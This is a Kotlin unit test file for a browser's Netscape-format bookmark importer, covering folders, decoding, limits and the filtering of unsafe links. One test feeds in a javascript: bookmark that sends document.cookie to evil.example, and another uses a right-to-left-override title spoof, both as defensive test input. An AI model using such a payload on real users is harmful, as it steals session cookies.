package com.dantech.skimbrowser.data.importer

import com.dantech.skimbrowser.data.repo.ImportedNode
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class NetscapeBookmarkParserTest {

    @Test
    fun aChromeExportKeepsItsFoldersSubfoldersAndOrder() {
        val nodes = NetscapeBookmarkParser.parse(fixture("chrome-export.html"))

        assertEquals(
            listOf(
                folder(
                    "Bookmarks bar",
                    link("Kotlin Docs", "https://kotlinlang.org/docs/home.html"),
                    folder(
                        "Travel & Trips",
                        link("Osaka \u2013 Guide & Tips", "https://www.japan-guide.com/e/e4000.html"),
                        link("Caf\u00e9 <Menu>", "http://example.org/caf%C3%A9?q=1&r=2"),
                    ),
                    link("Android Developers", "https://developer.android.com/"),
                ),
                folder(
                    "Other bookmarks",
                    link("Hacker News", "https://news.ycombinator.com/"),
                    folder("Empty folder"),
                ),
                link("Wikipedia", "https://www.wikipedia.org/"),
            ),
            nodes,
        )
    }

    @Test
    fun entitiesInTitlesAndLinksAreDecoded() {
        val nodes = NetscapeBookmarkParser.parse(fixture("chrome-export.html")).orEmpty()

        val travel = nodes.first().children[1]
        assertEquals("Travel & Trips", travel.title)
        assertEquals("Caf\u00e9 <Menu>", travel.children[1].title)
        assertEquals("http://example.org/caf%C3%A9?q=1&r=2", travel.children[1].url)
    }

    @Test
    fun onlyWebLinksWithAHostAreKept() {
        val urls = urlsOf(NetscapeBookmarkParser.parse(fixture("chrome-export.html")).orEmpty())

        assertEquals(6, urls.size)
        assertTrue("javascript:, file:, intent: and data: links are dropped: $urls", urls.all { it.startsWith("http") })
    }

    @Test
    fun aJavascriptBookmarkNeverComesThroughWhateverItsCase() {
        val nodes = NetscapeBookmarkParser.parse(
            bookmarkFile(
                """<DT><A HREF="JavaScript:alert(1)">Upper</A>""",
                """<DT><A HREF=" javascript:fetch('https://evil.example/'+document.cookie)">Spaced</A>""",
                """<DT><A HREF="https://">No host</A>""",
                """<DT><A HREF="https://kept.example/">Kept</A>""",
            ),
        )

        assertEquals(listOf(link("Kept", "https://kept.example/")), nodes)
    }

    @Test
    fun aPageThatIsNotABookmarkFileGivesNull() {
        assertNull(NetscapeBookmarkParser.parse(fixture("not-bookmarks.html")))
    }

    @Test
    fun textWithoutAnyListGivesNull() {
        assertNull(NetscapeBookmarkParser.parse("Kotlin https://kotlinlang.org/".toByteArray()))
    }

    @Test
    fun aBookmarkListWithoutTheDoctypeIsStillABookmarkFile() {
        val html = """<DL><p><DT><A HREF="https://kotlinlang.org/">Kotlin</A></DL><p>"""

        assertEquals(listOf(link("Kotlin", "https://kotlinlang.org/")), NetscapeBookmarkParser.parse(html.toByteArray()))
    }

    @Test
    fun aBookmarkFileWithoutBookmarksGivesAnEmptyList() {
        assertEquals(emptyList<ImportedNode>(), NetscapeBookmarkParser.parse(bookmarkFile()))
    }

    @Test
    fun aFolderListAfterAClosedEntryStillBelongsToTheFolder() {
        val html = bookmarkFile(
            """<DT><H3>Work</H3></DT>""",
            """<DL><p><DT><A HREF="https://example.com/a">A</A></DL><p>""",
            """<DT><A HREF="https://example.com/b">B</A>""",
        )

        assertEquals(
            listOf(folder("Work", link("A", "https://example.com/a")), link("B", "https://example.com/b")),
            NetscapeBookmarkParser.parse(html),
        )
    }

    @Test
    fun titlesAreKeptAsPlainVisibleText() {
        // U+202E, the right-to-left override, would make "Invoice" then "fdp.apk" read as "Invoicekpa.pdf".
        val nodes = NetscapeBookmarkParser.parse(
            bookmarkFile("""<DT><A HREF="https://example.com/i">Invoice&#x202E;fdp.apk &#x200B;now</A>"""),
        )

        assertEquals("Invoicefdp.apk now", nodes?.single()?.title)
    }

    @Test
    fun aLinkLongerThanTheLimitIsDropped() {
        val long = "https://example.com/" + "a".repeat(NetscapeBookmarkParser.MAX_URL_LENGTH)
        val atLimit = "https://example.com/" + "b".repeat(NetscapeBookmarkParser.MAX_URL_LENGTH - "https://example.com/".length)

        val nodes = NetscapeBookmarkParser.parse(
            bookmarkFile("""<DT><A HREF="$long">Long</A>""", """<DT><A HREF="$atLimit">At the limit</A>"""),
        )

        assertEquals(listOf(link("At the limit", atLimit)), nodes)
    }

    @Test
    fun aLongTitleIsCut() {
        val nodes = NetscapeBookmarkParser.parse(
            bookmarkFile("""<DT><A HREF="https://example.com/">${"t".repeat(NetscapeBookmarkParser.MAX_TITLE_LENGTH + 10)}</A>"""),
        )

        assertEquals(NetscapeBookmarkParser.MAX_TITLE_LENGTH, nodes?.single()?.title?.length)
    }

    @Test
    fun theEncodingTheFileNamesIsUsed() {
        val html = "<!DOCTYPE NETSCAPE-Bookmark-file-1>" +
            "<META HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html; charset=ISO-8859-1\">" +
            "<DL><p><DT><A HREF=\"https://example.com/\">Caf\u00e9</A></DL>"

        val nodes = NetscapeBookmarkParser.parse(html.toByteArray(Charsets.ISO_8859_1))

        assertEquals("Caf\u00e9", nodes?.single()?.title)
    }

    @Test
    fun aFileHoldsAtMostTheTagsTheParserWillBuild() {
        val atLimit = "<".repeat(NetscapeBookmarkParser.MAX_TAGS).toByteArray()
        val over = "<".repeat(NetscapeBookmarkParser.MAX_TAGS + 1).toByteArray()

        assertFalse(NetscapeBookmarkParser.hasTooManyTags(atLimit))
        assertTrue(NetscapeBookmarkParser.hasTooManyTags(over))
        assertFalse(NetscapeBookmarkParser.hasTooManyTags(ByteArray(0)))
    }

    @Test
    fun theTagLimitLeavesRoomForTheBiggestExportsPeopleHave() {
        // Three tags a bookmark: 80,000 bookmarks stay under the limit and all come through.
        val entry = """<DT><A HREF="https://example.com/">t</A>"""
        val file = bookmarkFile(*Array(80_000) { entry })

        assertFalse(NetscapeBookmarkParser.hasTooManyTags(file))
        assertEquals(80_000, NetscapeBookmarkParser.parse(file)?.size)
    }

    private fun fixture(name: String): ByteArray =
        checkNotNull(javaClass.classLoader?.getResourceAsStream("bookmarks/$name")) { "Missing fixture $name" }.use { it.readBytes() }

    private fun bookmarkFile(vararg entries: String): ByteArray =
        ("<!DOCTYPE NETSCAPE-Bookmark-file-1>\n<TITLE>Bookmarks</TITLE>\n<H1>Bookmarks</H1>\n<DL><p>\n" +
            entries.joinToString("\n") + "\n</DL><p>\n").toByteArray()

    private fun link(title: String, url: String) = ImportedNode(title, url)

    private fun folder(title: String, vararg children: ImportedNode) = ImportedNode(title, url = null, children = children.toList())

    private fun urlsOf(nodes: List<ImportedNode>): List<String> = nodes.flatMap { node ->
        listOfNotNull(node.url) + urlsOf(node.children)
    }
}
